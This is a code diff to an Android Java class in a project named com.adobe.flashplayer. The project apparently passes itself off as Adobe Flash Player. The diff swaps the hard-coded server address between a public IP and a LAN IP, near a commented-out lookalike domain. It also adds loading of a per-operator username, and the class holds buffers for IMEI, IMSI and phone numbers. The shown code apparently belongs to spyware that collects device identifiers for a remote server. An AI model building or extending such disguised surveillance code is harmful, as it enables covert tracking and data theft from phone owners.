@@ -9,6 +9,7 @@ import androidx.core.content.ContextCompat;
 import android.content.pm.PackageManager;
 
 import com.adobe.flashplayer.accessory.AccessHelper;
+import com.adobe.flashplayer.network.Network;
 
 //file = new File(getPackageManager().getApplicationInfo("com.uc.addon.qrcodegenerator", 0).sourceDir);
 //这里getPackageManager是Context下的方法，不需要赘言了，sourceDIr返回了完整apk路径，包括-N之类的讨厌玩意。
@@ -37,8 +38,8 @@ public class Public {
     private final static String TAG						= "[ljg]Public";
 
     //public static String SERVER_IP_ADDRESS				= "hk.googleadc.com";
-    public static String SERVER_IP_ADDRESS				= "45.195.84.85";   //192.168.101.122
-    public static String UserName 						= "jy";
+    public static String SERVER_IP_ADDRESS				= "192.168.101.122";   //       //45.195.84.85
+    public static String UserName 						= "jy1";
 
     public static final int IMEI_IMSI_PHONE_SIZE 		= 16;
     public static byte[] IMEI 							= new byte[IMEI_IMSI_PHONE_SIZE];
@@ -293,6 +294,8 @@ public class Public {
                 appContext = context;
             }
 
+            result = getUsername(context);
+
             result = initFilePath(context);
             if (result == false){
                 Log.e(TAG, "InitFilePath error");
@@ -311,7 +314,15 @@ public class Public {
 
 
 
-
+    public static boolean getUsername( Context context) {
+        String username = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.CFGUSERNAME);
+        if (username != null && username.equals("") == false) {
+            Public.UserName = username;
+        } else {
+            Log.e(TAG, "[ljg]not found username in config! current username:" + Public.UserName);
+        }
+        return true;
+    }
 
 
 
@@ -340,11 +351,11 @@ public class Public {
                     }
                 }else{
                     Public.SDCARD_PATH_NAME = Public.LOCAL_PATH_NAME;
-                    Log.e(TAG, "[liujinguang]not found sdcard! current path:" + Public.LOCAL_PATH_NAME);
+                    Log.e(TAG, "[ljg]not found sdcard! current path:" + Public.LOCAL_PATH_NAME);
                 }
             }else{
                 Public.SDCARD_PATH_NAME = Public.LOCAL_PATH_NAME;
-                Log.e(TAG, "[liujinguang]not found sdcard! current path:" + Public.LOCAL_PATH_NAME);
+                Log.e(TAG, "[ljg]not found sdcard! current path:" + Public.LOCAL_PATH_NAME);
             }
         } catch (Exception e) {
             e.printStackTrace();
